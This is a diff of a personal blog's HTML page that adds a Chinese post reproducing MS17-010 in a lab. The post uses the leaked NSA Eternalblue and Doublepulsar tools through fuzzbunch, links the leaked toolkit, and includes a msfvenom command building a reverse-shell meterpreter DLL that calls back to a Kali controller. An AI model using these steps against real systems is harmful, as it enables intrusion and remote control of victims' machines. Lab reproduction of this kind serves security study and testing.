@@ -81,7 +81,7 @@
 <link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="Reverse&pwn" />
+  <meta name="keywords" content="Enternalblue,Doublepulsar,NSA,SMB,Metasploit" />
 
 
 
@@ -99,15 +99,28 @@
 
 
 
-<meta name="description" content="Reverse&amp;Pwn">
-<meta property="og:type" content="website">
-<meta property="og:title" content="0x4C43's Blog">
-<meta property="og:url" content="http://0x4c43.cn/index.html">
+<meta name="description" content="2017年4月14日，Shadow Brokers 再次公开了大量从 NSA 的方程式组织（Equation Group）处窃取的攻击工具，这些工具主要针对 Windows 系统的漏洞，其中还有几个 0 day。工具中的 fuzzbunch 是一个类似于 metasploit 的漏洞利用框架，fb.py 是 fuzzbunch 的入口文件，通过该文件可以调用各攻击模块。 泄露的工具可在 Githu">
+<meta name="keywords" content="Enternalblue,Doublepulsar,NSA,SMB,Metasploit">
+<meta property="og:type" content="article">
+<meta property="og:title" content="NSA Enternalblue + Doublepulsar 复现 MS17-010">
+<meta property="og:url" content="http://0x4c43.cn/NSA Enternalblue + Doublepulsar 复现 MS17-010/index.html">
 <meta property="og:site_name" content="0x4C43's Blog">
-<meta property="og:description" content="Reverse&amp;Pwn">
+<meta property="og:description" content="2017年4月14日，Shadow Brokers 再次公开了大量从 NSA 的方程式组织（Equation Group）处窃取的攻击工具，这些工具主要针对 Windows 系统的漏洞，其中还有几个 0 day。工具中的 fuzzbunch 是一个类似于 metasploit 的漏洞利用框架，fb.py 是 fuzzbunch 的入口文件，通过该文件可以调用各攻击模块。 泄露的工具可在 Githu">
+<meta property="og:image" content="http://ooyovxue7.bkt.clouddn.com/17-4-28/92526918-file_1493343199647_16966.jpg">
+<meta property="og:image" content="http://ooyovxue7.bkt.clouddn.com/17-4-28/95094523-file_1493344655277_8614.png">
+<meta property="og:image" content="http://ooyovxue7.bkt.clouddn.com/17-4-28/54184530-file_1493344922256_adf5.png">
+<meta property="og:image" content="http://ooyovxue7.bkt.clouddn.com/17-4-28/61786740-file_1493345114952_f2f3.png">
+<meta property="og:image" content="http://ooyovxue7.bkt.clouddn.com/17-4-28/73280707-file_1493345362094_157db.png">
+<meta property="og:image" content="http://ooyovxue7.bkt.clouddn.com/17-4-28/80220500-file_1493346556508_101d9.png">
+<meta property="og:image" content="http://ooyovxue7.bkt.clouddn.com/17-4-28/11038492-file_1493347262266_5c5.png">
+<meta property="og:image" content="http://ooyovxue7.bkt.clouddn.com/17-4-28/68357990-file_1493347997057_2e1f.png">
+<meta property="og:image" content="http://ooyovxue7.bkt.clouddn.com/17-4-28/56721083-file_1493348716416_6f00.png">
+<meta property="og:image" content="http://ooyovxue7.bkt.clouddn.com/17-4-28/82624178-file_1493348105266_34db.png">
+<meta property="og:updated_time" content="2017-04-28T04:44:37.903Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="0x4C43's Blog">
-<meta name="twitter:description" content="Reverse&amp;Pwn">
+<meta name="twitter:title" content="NSA Enternalblue + Doublepulsar 复现 MS17-010">
+<meta name="twitter:description" content="2017年4月14日，Shadow Brokers 再次公开了大量从 NSA 的方程式组织（Equation Group）处窃取的攻击工具，这些工具主要针对 Windows 系统的漏洞，其中还有几个 0 day。工具中的 fuzzbunch 是一个类似于 metasploit 的漏洞利用框架，fb.py 是 fuzzbunch 的入口文件，通过该文件可以调用各攻击模块。 泄露的工具可在 Githu">
+<meta name="twitter:image" content="http://ooyovxue7.bkt.clouddn.com/17-4-28/92526918-file_1493343199647_16966.jpg">
 
 
 
@@ -135,7 +148,7 @@
 
 
 
-  <link rel="canonical" href="http://0x4c43.cn/"/>
+  <link rel="canonical" href="http://0x4c43.cn/NSA Enternalblue + Doublepulsar 复现 MS17-010/"/>
 
 
 
@@ -143,7 +156,7 @@
 
 
 
-  <title> 0x4C43's Blog - Reverse&Pwn </title>
+  <title> NSA Enternalblue + Doublepulsar 复现 MS17-010 | 0x4C43's Blog </title>
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="en">
@@ -168,9 +181,7 @@
     
   
 
-  <div class="container sidebar-position-left 
-   page-home 
- ">
+  <div class="container sidebar-position-left page-post-detail ">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
@@ -307,9 +318,9 @@
         <div class="content-wrap">
           <div id="content" class="content">
             
-  <section id="posts" class="posts-expand">
+
+  <div id="posts" class="posts-expand">
     
-      
 
   
 
@@ -339,10 +350,7 @@
             
             
               
-                
-                <a class="post-title-link" href="/NSA Enternalblue + Doublepulsar 复现 MS17-010/" itemprop="url">
-                  NSA Enternalblue + Doublepulsar 复现 MS17-010
-                </a>
+                NSA Enternalblue + Doublepulsar 复现 MS17-010
               
             
           </h1>
@@ -393,163 +401,29 @@
 
           
             
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body han-init-context" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-          2017年4月14日，Shadow Brokers 再次公开了大量从 NSA 的方程式组织（Equation Group）处窃取的攻击工具，这些工具主要针对 Windows 系统的漏洞，其中还有几个 0 day。工具中的 fuzzbunch 是一个类似于 metasploit 的漏洞利用框架，fb.
-          ...
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/NSA Enternalblue + Doublepulsar 复现 MS17-010/#more" rel="contents">
-              Read more &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://0x4c43.cn/Github+Hexo+NexT搭建个人博客/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="0x4C43">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/uploads/avatar.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="0x4C43's Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/Github+Hexo+NexT搭建个人博客/" itemprop="url">
-                  Github+Hexo+NexT搭建个人博客
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-04-26T20:42:00+08:00">
-                2017-04-26
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/others/" itemprop="url" rel="index">
-                    <span itemprop="name">others</span>
-                  </a>
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
                 </span>
+                <a class="cloud-tie-join-count" href="/NSA Enternalblue + Doublepulsar 复现 MS17-010/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count join-count" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
 
-                
-                
-              
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv">阅读次数
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
             </span>
           
 
           
-            
-          
-
-          
-          
-
-          
-
-          
 
           
 
@@ -564,202 +438,125 @@
       
 
       
+        <p>2017年4月14日，Shadow Brokers 再次公开了大量从 NSA 的方程式组织（Equation Group）处窃取的攻击工具，这些工具主要针对 Windows 系统的漏洞，其中还有几个 0 day。工具中的 fuzzbunch 是一个类似于 metasploit 的漏洞利用框架，fb.py 是 fuzzbunch 的入口文件，通过该文件可以调用各攻击模块。</p>
+<p>泄露的工具可在 Github 下载：<a href="https://github.com/misterch0c/shadowbroker" target="_blank" rel="external">https://github.com/misterch0c/shadowbroker</a></p>
+<h3 id="0x01-影响范围"><a href="#0x01-影响范围" class="headerlink" title="0x01 影响范围"></a><strong>0x01 影响范围</strong></h3><p>下图中列举了工具中相关模块所影响的服务和系统。<br><img src="http://ooyovxue7.bkt.clouddn.com/17-4-28/92526918-file_1493343199647_16966.jpg" alt=""></p>
+<h3 id="0x02-漏洞测试"><a href="#0x02-漏洞测试" class="headerlink" title="0x02 漏洞测试"></a><strong>0x02 漏洞测试</strong></h3><p>下面使用工具中的 fuzzbunch 框架、Eternalblue 和 Doublepulsar 测试 Windows 下的 SMB 漏洞。首先通过 Eternalblue 利用 MS17-010 漏洞攻击 Windows 系统；然后在 Kali Linux 中用 Metasploit 生成一个能建立反向连接的 DLL，并在 Kali 中监听相应端口；最后使用 Doublepulsar 远程注入恶意 DLL 到目标系统，注入成功后 Kali 将与目标系统建立连接。</p>
+<h4 id="1-测试环境"><a href="#1-测试环境" class="headerlink" title="1. 测试环境"></a><strong>1. 测试环境</strong></h4><table>
+<thead>
+<tr>
+<th style="text-align:left">PC</th>
+<th style="text-align:left">IP</th>
+<th>用途</th>
+<th>备注</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">Win 7 x64</td>
+<td style="text-align:left">192.168.109.1</td>
+<td>攻击机</td>
+<td>需安装 <a href="https://www.python.org/ftp/python/2.6.6/python-2.6.6.msi" target="_blank" rel="external">python2.6</a>  和 <a href="https://sourceforge.net/projects/pywin32/files/pywin32/Build%20221/pywin32-221.win32-py2.6.exe/download" target="_blank" rel="external">pywin32</a></td>
+</tr>
+<tr>
+<td style="text-align:left">Win 7 x86</td>
+<td style="text-align:left">192.168.109.132</td>
+<td>靶机</td>
+<td>开启 SMB 服务（445端口）</td>
+</tr>
+<tr>
+<td style="text-align:left">Kali Linux</td>
+<td style="text-align:left">192.168.109.128</td>
+<td>控制端</td>
+<td>生成payload 并控制回连会话</td>
+</tr>
+</tbody>
+</table>
+<p>首先需要把工具中的 windows 拷贝到攻击机 Win 7 x64中，然后在 windows 目录下新建一个 listeningposts 文件夹。</p>
+<h4 id="2-测试流程"><a href="#2-测试流程" class="headerlink" title="2. 测试流程"></a><strong>2. 测试流程</strong></h4><h5 id="1）运行-fuzzbunch-框架"><a href="#1）运行-fuzzbunch-框架" class="headerlink" title="1）运行 fuzzbunch 框架"></a><strong>1）运行 fuzzbunch 框架</strong></h5><p>在 cmd 中进入 windows 目录，运行 <code>python fb.py</code>。输入目标系统 IP（Win 7 x86）和攻击机 IP（Win 7 x64），输入“no” 不重定向，接着输入项目名新建一个项目。<br><img src="http://ooyovxue7.bkt.clouddn.com/17-4-28/95094523-file_1493344655277_8614.png" alt=""></p>
+<h5 id="2）调用-Eternalblue-攻击系统"><a href="#2）调用-Eternalblue-攻击系统" class="headerlink" title="2）调用 Eternalblue 攻击系统"></a><strong>2）调用 Eternalblue 攻击系统</strong></h5><p>运行<code>use Eternalblue</code>，然后大多数步骤只需按回车使用默认参数即可。<br><img src="http://ooyovxue7.bkt.clouddn.com/17-4-28/54184530-file_1493344922256_adf5.png" alt=""><br>下面需要选择 <code>1）FB</code> 模式。<br><img src="http://ooyovxue7.bkt.clouddn.com/17-4-28/61786740-file_1493345114952_f2f3.png" alt=""><br>接着继续回车，直到成功运行攻击模块。<br><img src="http://ooyovxue7.bkt.clouddn.com/17-4-28/73280707-file_1493345362094_157db.png" alt=""></p>
+<h5 id="3）Metasploit-生成恶意-DLL"><a href="#3）Metasploit-生成恶意-DLL" class="headerlink" title="3）Metasploit 生成恶意 DLL"></a><strong>3）Metasploit 生成恶意 DLL</strong></h5><p>在 Kali Linux 下使用 Metasploit 生成恶意 DLL,它将在目标系统中建立一个反向连接。这里生成的 DLL必须要与目标系统版本一致，下面生成 32 bit 的 DLL。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.109.128 LPORT=6666 -f dll &gt; test.dll</div></pre></td></tr></table></figure></p>
+<p>之后需要将生成的 test.dll 拷贝到攻击机的 D:\下。</p>
+<h5 id="4）开启-msf-监听"><a href="#4）开启-msf-监听" class="headerlink" title="4）开启 msf 监听"></a><strong>4）开启 msf 监听</strong></h5><p>在 Kali Linux 下，运行 msf，监听 6666 端口。<br><img src="http://ooyovxue7.bkt.clouddn.com/17-4-28/80220500-file_1493346556508_101d9.png" alt=""></p>
+<h5 id="5）调用-Doublepulsar-注入-DLL"><a href="#5）调用-Doublepulsar-注入-DLL" class="headerlink" title="5）调用 Doublepulsar 注入 DLL"></a><strong>5）调用 Doublepulsar 注入 DLL</strong></h5><p>回到攻击机中，执行 <code>use Doublepulsar</code> ，回车使用默认参数直到选择 Function 为2 注入 DLL，然后指定 DLL 的路径。<br><img src="http://ooyovxue7.bkt.clouddn.com/17-4-28/11038492-file_1493347262266_5c5.png" alt=""><br>注入成功后将返回如下信息。<br><img src="http://ooyovxue7.bkt.clouddn.com/17-4-28/68357990-file_1493347997057_2e1f.png" alt=""><br>但是这里也会出现个问题，多次注入之后目标系统会出错重启。<br><img src="http://ooyovxue7.bkt.clouddn.com/17-4-28/56721083-file_1493348716416_6f00.png" alt=""></p>
+<h5 id="6）建立连接"><a href="#6）建立连接" class="headerlink" title="6）建立连接"></a><strong>6）建立连接</strong></h5><p>DLL 注入到目标系统之后，Kali Linux 将与目标系统建立连接。<br><img src="http://ooyovxue7.bkt.clouddn.com/17-4-28/82624178-file_1493348105266_34db.png" alt=""></p>
+<hr>
+<p>References:<br>[1] NSA工具包之0day Eternalblue 复现笔记：<a href="http://blog.injectxx.com/2017/04/18/%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0%E3%80%82/" target="_blank" rel="external">http://blog.injectxx.com/2017/04/18/%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0%E3%80%82/</a><br>[2] HOW TO EXPLOIT ETERNALBLUE &amp; DOUBLEPULSAR TO GET AN<br>EMPIRE/METERPRETER SESSION ON WINDOWS 7/2008：<a href="https://www.exploit-db.com/docs/41896.pdf" target="_blank" rel="external">https://www.exploit-db.com/docs/41896.pdf</a></p>
+
+      
+    </div>
+
+    <div>
+      
         
-          
-          平时在网上查文档的时候经常能看到一些非常好的博客，然后就想着自己也搭一个，一方面可以记录一些问题的解决方法，以便查阅，另一方面希望能促使自己多总结，多写文档。所以，经过这几天的折腾，终于把基本功能都搭好了。下面是搭建过程的记录，以下操作在 ubuntu14.04 x86_64中进行。
-0x01 安装
-          ...
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/Github+Hexo+NexT搭建个人博客/#more" rel="contents">
-              Read more &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
+
+      
+    </div>
+
+    <div>
+      
         
+
       
     </div>
 
     <div>
       
-    </div>
+        
 
-    <div>
-      
-    </div>
-
-    <div>
       
     </div>
 
     <footer class="post-footer">
       
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://0x4c43.cn/使用Atom+Markdown写文章/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="0x4C43">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/uploads/avatar.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="0x4C43's Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/使用Atom+Markdown写文章/" itemprop="url">
-                  使用Atom+Markdown写文章
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-04-26T15:36:08+08:00">
-                2017-04-26
-              </time>
-            
-
-            
-
-            
-          </span>
-
+        <div class="post-tags">
           
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/others/" itemprop="url" rel="index">
-                    <span itemprop="name">others</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
+            <a href="/tags/Enternalblue/" rel="tag"># Enternalblue</a>
           
-
+            <a href="/tags/Doublepulsar/" rel="tag"># Doublepulsar</a>
           
-            
+            <a href="/tags/NSA/" rel="tag"># NSA</a>
           
-
+            <a href="/tags/SMB/" rel="tag"># SMB</a>
           
+            <a href="/tags/Metasploit/" rel="tag"># Metasploit</a>
           
-
-          
-
-          
-
-          
-
         </div>
-      </header>
-    
-
-
-    <div class="post-body han-init-context" itemprop="articleBody">
-
-      
       
 
       
         
-          
-          0x01 AtomAtom 是 Github 推出的一个开源跨平台文本编辑器。具有简洁和直观的图形用户界面，支持 CSS、HTML、JavaScript 等网页编程语言。 并且支持宏和自动分屏等功能，还集成了文件管理器。同时，Atom 也支持 Markdown 语法，所以可以很方便地写 Hexo b
-          ...
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/使用Atom+Markdown写文章/#more" rel="contents">
-              Read more &raquo;
-            </a>
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
           </div>
-          <!--/noindex-->
-        
-      
-    </div>
 
-    <div>
-      
-    </div>
+          <span class="post-nav-divider"></span>
 
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/Github+Hexo+NexT搭建个人博客/" rel="prev" title="Github+Hexo+NexT搭建个人博客">
+                Github+Hexo+NexT搭建个人博客 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
       
 
       
-
-      
-
-      
-      
-        <div class="post-eof"></div>
       
     </footer>
   </article>
 
 
-    
-  </section>
 
-  
+    <div class="post-spread">
+      
+    </div>
+  </div>
 
 
           </div>
@@ -767,6 +564,12 @@
 
 
           
+  <div class="comments" id="comments">
+    
+      <div id="cloud-tie-wrapper" class="cloud-tie-wrapper"></div>
+    
+  </div>
+
 
         </div>
         
@@ -786,8 +589,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            Overview
+          </li>
+        </ul>
+      
 
-      <section class="site-overview sidebar-panel sidebar-panel-active">
+      <section class="site-overview sidebar-panel">
         <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
           <img class="site-author-image" itemprop="image"
                src="/uploads/avatar.jpg"
@@ -887,6 +699,22 @@
 
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-影响范围"><span class="nav-number">1.</span> <span class="nav-text">0x01 影响范围</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-漏洞测试"><span class="nav-number">2.</span> <span class="nav-text">0x02 漏洞测试</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-测试环境"><span class="nav-number">2.1.</span> <span class="nav-text">1. 测试环境</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-测试流程"><span class="nav-number">2.2.</span> <span class="nav-text">2. 测试流程</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1）运行-fuzzbunch-框架"><span class="nav-number">2.2.1.</span> <span class="nav-text">1）运行 fuzzbunch 框架</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2）调用-Eternalblue-攻击系统"><span class="nav-number">2.2.2.</span> <span class="nav-text">2）调用 Eternalblue 攻击系统</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3）Metasploit-生成恶意-DLL"><span class="nav-number">2.2.3.</span> <span class="nav-text">3）Metasploit 生成恶意 DLL</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#4）开启-msf-监听"><span class="nav-number">2.2.4.</span> <span class="nav-text">4）开启 msf 监听</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#5）调用-Doublepulsar-注入-DLL"><span class="nav-number">2.2.5.</span> <span class="nav-text">5）调用 Doublepulsar 注入 DLL</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#6）建立连接"><span class="nav-number">2.2.6.</span> <span class="nav-text">6）建立连接</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
@@ -1009,6 +837,10 @@
   
 
   
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.0"></script>
+
+
 
   
 
